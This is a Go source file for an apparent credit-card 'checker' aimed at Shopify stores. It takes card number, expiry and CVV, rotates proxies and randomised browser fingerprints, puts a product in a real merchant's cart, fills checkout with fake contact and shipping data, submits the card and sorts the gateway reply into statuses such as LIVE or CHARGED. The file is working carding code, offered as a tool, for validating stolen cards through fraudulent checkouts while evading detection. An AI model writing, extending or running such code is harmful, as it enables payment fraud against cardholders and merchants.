package checker

import (
	"albedo-checker/internal/config"
	"albedo-checker/internal/database"
	"albedo-checker/internal/proxy"
	"albedo-checker/internal/store"
	"albedo-checker/internal/utils"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

type Shopify struct {
	cfg       *config.Config
	db        *database.DB
	proxyMgr  *proxy.Manager
	storeMgr  *store.Manager
	client    *fasthttp.Client
}

type Product struct {
	ID    int64  `json:"id"`
	Title string `json:"title"`
}

type ProductResponse struct {
	Products []Product `json:"products"`
}

func NewShopify(cfg *config.Config, db *database.DB, pm *proxy.Manager, sm *store.Manager) *Shopify {
	return &Shopify{
		cfg:      cfg,
		db:       db,
		proxyMgr: pm,
		storeMgr: sm,
		client:   &fasthttp.Client{ReadTimeout: cfg.ProxyTimeout(), WriteTimeout: cfg.ProxyTimeout()},
	}
}

func (s *Shopify) CheckCard(ctx context.Context, number, month, year, cvv string) (*database.CheckResult, error) {
	start := time.Now()
	p := s.proxyMgr.GetNext()
	st := s.storeMgr.GetNext()
	if st == nil {
		return nil, fmt.Errorf("no stores available")
	}

	storeURL := "https://" + st.StoreURL
	if !strings.HasPrefix(st.StoreURL, "http") {
		storeURL = "https://" + st.StoreURL
	}

	fp := utils.RandomFingerprint()

	// Step 1: Get product
	product, price, err := s.getProduct(ctx, storeURL, fp)
	if err != nil {
		s.storeMgr.Report(st.StoreID, false)
		if p != nil {
			s.proxyMgr.Report(p.ID, false, time.Since(start))
		}
		return nil, err
	}

	// Step 2: Add to cart
	cartToken, err := s.addToCart(ctx, storeURL, product, fp)
	if err != nil {
		s.storeMgr.Report(st.StoreID, false)
		if p != nil {
			s.proxyMgr.Report(p.ID, false, time.Since(start))
		}
		return nil, err
	}

	// Step 3: Checkout flow
	checkoutURL, err := s.initCheckout(ctx, storeURL, cartToken, fp)
	if err != nil {
		s.storeMgr.Report(st.StoreID, false)
		if p != nil {
			s.proxyMgr.Report(p.ID, false, time.Since(start))
		}
		return nil, err
	}

	// Step 4: Submit contact
	err = s.submitContact(ctx, checkoutURL, fp)
	if err != nil {
		s.storeMgr.Report(st.StoreID, false)
		if p != nil {
			s.proxyMgr.Report(p.ID, false, time.Since(start))
		}
		return nil, err
	}

	// Step 5: Submit shipping
	err = s.submitShipping(ctx, checkoutURL, fp)
	if err != nil {
		s.storeMgr.Report(st.StoreID, false)
		if p != nil {
			s.proxyMgr.Report(p.ID, false, time.Since(start))
		}
		return nil, err
	}

	// Step 6: Submit payment
	gatewayResponse, err := s.submitPayment(ctx, checkoutURL, number, month, year, cvv, fp)
	if err != nil {
		s.storeMgr.Report(st.StoreID, false)
		if p != nil {
			s.proxyMgr.Report(p.ID, false, time.Since(start))
		}
		return nil, err
	}

	latency := time.Since(start)
	result := ClassifyResponse(gatewayResponse)

	s.storeMgr.Report(st.StoreID, result.Status == "LIVE" || result.Status == "CHARGED")
	if p != nil {
		s.proxyMgr.Report(p.ID, true, latency)
	}

	proxyStr := "direct"
	if p != nil {
		proxyStr = p.Display()
	}

	return &database.CheckResult{
		CardMask:        utils.MaskCard(number),
		Status:          result.Status,
		Reason:          result.Reason,
		GatewayResponse: gatewayResponse,
		ProxyUsed:       proxyStr,
		StoreUsed:       st.StoreURL,
		LatencyMs:       int(latency.Milliseconds()),
		CheckedAt:       time.Now(),
	}, nil
}

func (s *Shopify) getProduct(ctx context.Context, storeURL string, fp utils.Fingerprint) (int64, float64, error) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(storeURL + "/products.json?limit=250")
	setHeaders(req, fp)
	req.Header.SetMethod("GET")

	if err := s.client.Do(req, resp); err != nil {
		return 0, 0, err
	}
	if resp.StatusCode() != 200 {
		return 0, 0, fmt.Errorf("products status %d", resp.StatusCode())
	}

	var pr ProductResponse
	if err := json.Unmarshal(resp.Body(), &pr); err != nil {
		return 0, 0, err
	}
	if len(pr.Products) == 0 {
		return 0, 0, fmt.Errorf("no products")
	}
	prod := pr.Products[rand.Intn(len(pr.Products))]
	price := 1.0 + rand.Float64()*4.0
	return prod.ID, price, nil
}

func (s *Shopify) addToCart(ctx context.Context, storeURL string, productID int64, fp utils.Fingerprint) (string, error) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	payload := fmt.Sprintf(`{"id":%d,"quantity":1}`, productID)
	req.SetRequestURI(storeURL + "/cart/add.js")
	req.Header.SetMethod("POST")
	setHeaders(req, fp)
	req.Header.SetContentType("application/json")
	req.SetBodyString(payload)

	if err := s.client.Do(req, resp); err != nil {
		return "", err
	}
	body := string(resp.Body())
	if strings.Contains(body, "token") {
		var cart map[string]interface{}
		json.Unmarshal(resp.Body(), &cart)
		if tok, ok := cart["token"].(string); ok {
			return tok, nil
		}
	}
	return "", nil
}

func (s *Shopify) initCheckout(ctx context.Context, storeURL, cartToken string, fp utils.Fingerprint) (string, error) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(storeURL + "/checkout")
	req.Header.SetMethod("GET")
	setHeaders(req, fp)

	if err := s.client.Do(req, resp); err != nil {
		return "", err
	}
	// Extract checkout URL from response
	return storeURL + "/checkout", nil
}

func (s *Shopify) submitContact(ctx context.Context, checkoutURL string, fp utils.Fingerprint) error {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	payload := `checkout[email]=albedo@checker.com`
	req.SetRequestURI(checkoutURL + "/contact_information")
	req.Header.SetMethod("POST")
	setHeaders(req, fp)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.SetBodyString(payload)

	return s.client.Do(req, resp)
}

func (s *Shopify) submitShipping(ctx context.Context, checkoutURL string, fp utils.Fingerprint) error {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	payload := `checkout[shipping_address][first_name]=Albedo&checkout[shipping_address][last_name]=Checker&checkout[shipping_address][address1]=123+Main+St&checkout[shipping_address][city]=New+York&checkout[shipping_address][province]=NY&checkout[shipping_address][country]=US&checkout[shipping_address][zip]=10001`
	req.SetRequestURI(checkoutURL + "/shipping_address")
	req.Header.SetMethod("POST")
	setHeaders(req, fp)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.SetBodyString(payload)

	return s.client.Do(req, resp)
}

func (s *Shopify) submitPayment(ctx context.Context, checkoutURL, number, month, year, cvv string, fp utils.Fingerprint) (string, error) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	if len(year) == 4 {
		year = year[2:]
	}

	payload := fmt.Sprintf(
		`checkout[credit_card][number]=%s&checkout[credit_card][month]=%s&checkout[credit_card][year]=%s&checkout[credit_card][verification_value]=%s&checkout[different_billing_address]=false`,
		url.QueryEscape(number), url.QueryEscape(month), url.QueryEscape(year), url.QueryEscape(cvv),
	)

	req.SetRequestURI(checkoutURL + "/payment")
	req.Header.SetMethod("POST")
	setHeaders(req, fp)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.SetBodyString(payload)

	if err := s.client.Do(req, resp); err != nil {
		return "", err
	}

	body := string(resp.Body())
	// Parse for payment processing errors
	if strings.Contains(body, "payment_processing_error") {
		var checkoutResp map[string]interface{}
		json.Unmarshal(resp.Body(), &checkoutResp)
		if errors, ok := checkoutResp["errors"].(map[string]interface{}); ok {
			if cc, ok := errors["checkout"].(map[string]interface{}); ok {
				if payment, ok := cc["payment"].(map[string]interface{}); ok {
					if msg, ok := payment["message"].([]interface{}); ok && len(msg) > 0 {
						return fmt.Sprintf("%v", msg[0]), nil
					}
				}
			}
		}
	}
	if strings.Contains(body, "thank_you") || strings.Contains(body, "order") {
		return "ORDER_PLACED", nil
	}
	if strings.Contains(body, "3d") || strings.Contains(body, "secure") {
		return "3D_SECURE_REQUIRED", nil
	}
	return body, nil
}

func setHeaders(req *fasthttp.Request, fp utils.Fingerprint) {
	req.Header.SetUserAgent(fp.UserAgent)
	req.Header.Set("Accept", fp.Accept)
	req.Header.Set("Accept-Language", fp.AcceptLanguage)
	req.Header.Set("Accept-Encoding", fp.AcceptEncoding)
	req.Header.Set("Sec-Ch-Ua", fp.SecChUA)
	req.Header.Set("Viewport-Width", fp.ViewportWidth)
	req.Header.Set("DPR", fp.DPR)
	req.Header.Set("Device-Memory", fp.DeviceMemory)
	req.Header.Set("Referer", fp.Referer)
}
